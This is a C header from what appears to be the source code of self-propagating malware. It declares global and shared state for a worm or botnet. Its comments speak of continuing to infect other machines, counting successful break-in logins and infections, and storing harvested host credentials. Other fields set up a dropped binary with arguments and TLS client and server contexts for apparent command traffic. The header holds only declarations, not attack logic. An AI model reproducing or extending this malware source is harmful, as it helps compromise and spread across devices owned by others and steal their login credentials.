#pragma once
#include "pack.h"
#include "resolv.h"

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <sys/types.h>

#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>


struct prne_global { // TODO: tidy init code when finalised
	struct timespec parent_start;
	struct timespec child_start;
	uint8_t boot_id[16];
	uint8_t instance_id[16];
	pth_t main_pth;
	/*
	* Could be NULL. Just keep infecting other machines without it.
	*/
	prne_resolv_t *resolv;
	pid_t parent_pid;
	pid_t child_pid;
	int shm_fd;
	uint8_t *m_dvault;
	const uint8_t *m_exec;
	size_t exec_size;
	const uint8_t *m_exec_dvault;
	uint16_t dvault_size;
	bool bin_ready;
	bool is_child;

	prne_bin_archive_t bin_archive;

	struct {
		mbedtls_x509_crt ca;
		mbedtls_entropy_context entpy;
		mbedtls_ctr_drbg_context rnd;
	} ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
		mbedtls_dhm_context dhm;
	} s_ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
	} c_ssl;
};

struct prne_shared_global {
	// Format Revision
	uint8_t rev;
	// Number of child process crash.
	uint32_t crash_cnt;
	// "break and entry" count. Number of successful logins.
	uint64_t bne_cnt;
	// Number of successful infections.
	uint64_t infect_cnt;
	// null-terminated name of new binary
	char ny_bin_path[256];
	char ny_bin_args[1024];
	char host_cred_data[256];
};


extern struct prne_global prne_g;
// could be NULL on some environments
extern struct prne_shared_global *prne_s_g;
